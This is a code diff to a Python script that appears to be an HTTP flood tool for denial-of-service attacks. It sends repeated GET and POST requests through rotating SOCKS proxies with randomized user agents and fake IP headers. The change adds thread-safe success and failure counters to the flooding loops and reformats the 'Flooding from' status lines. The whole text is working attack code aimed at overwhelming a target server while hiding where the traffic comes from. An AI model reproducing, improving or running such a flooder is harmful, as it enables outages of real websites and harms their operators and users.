@@ -182,7 +182,15 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
+
+success_count = 0
+fail_count = 0
+lock = threading.Lock()
+
 def cc(socks_type):
+	global success_count
+	global fail_count
+	global lock
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
@@ -204,14 +212,18 @@ def cc(socks_type):
 		request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 		try:
 			if err > 3:
-				print("[!] Target or proxy maybe down| Changing proxy")
+				with lock:
+					fail_count += 1
+				print("[!] ["+str(success_count)+"/"+str(fail_count)+"] Target or proxy maybe down| Changing proxy")
 				break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			with lock:
+				success_count += 1
+			print ("[*] ["+str(success_count)+"/"+str(fail_count)+"] "+n+" From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
@@ -223,6 +235,9 @@ def cc(socks_type):
 			err = err +1
 	cc(socks_type)
 def post(socks_type):
+	global success_count
+	global fail_count
+	global lock
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	length = "Content-Length: 16 \r\nConnection: Keep-Alive\r\n"
@@ -244,14 +259,18 @@ def post(socks_type):
 	while True:
 		try:
 			if err > 3:
-				print("[!] Target or proxy maybe down| Changing proxy")
+				with lock:
+					fail_count += 1
+				print("[!] ["+str(success_count)+"/"+str(fail_count)+"] Target or proxy maybe down| Changing proxy")
 				break
 			s = socks.socksocket()
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
+			with lock:
+				success_count += 1
+			print ("[*] ["+str(success_count)+"/"+str(fail_count)+"] "+n+" POST From | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
